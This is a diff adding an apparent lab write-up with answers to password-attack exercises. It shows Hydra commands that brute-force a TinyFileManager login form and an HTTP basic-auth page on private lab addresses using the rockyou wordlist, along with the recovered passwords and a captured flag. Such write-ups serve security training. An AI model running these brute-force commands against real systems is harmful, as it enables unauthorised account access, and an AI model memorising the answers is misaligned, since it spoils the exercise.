@@ -1,0 +1,30 @@
+Question 1
+Follow the steps from this section to gain access to TinyFileManager on VM #1 (BRUTE). Once logged in, find the flag.
+
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.207.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+[80][http-post-form] host: 192.168.207.201   login: user   password: 121212
+
+Access to http://192.168.207.201
+with the user and password BRUTE
+
+Open install.txt file
+File "install.txt"
+
+Full path: /var/www/html/install.txt
+File size: 87 bytes
+MIME-type: text/plain
+Charset: utf-8
+Hola! Here is the secret API key - Don't share it
+OS{d26419f4a5621fb1aaaa9f7e4ab143f3}
+
+Question 2
+The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user admin. Once you have identified the correct password, enter it as answer to this exercise. The authentication mechanism here is HTTP basic authentication.
+Hydra support various protocols such as http-get and http-post which can be used depending on the application to perform a dictionary attack to obtain the password.
+
+References
+https://notes.benheater.com/books/hydra/page/brute-force-http-basic-authentication-with-hydra
+https://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.207.201 http-get / 
+[80][http-get] host: 192.168.207.201  login: admin   password: 789456
+
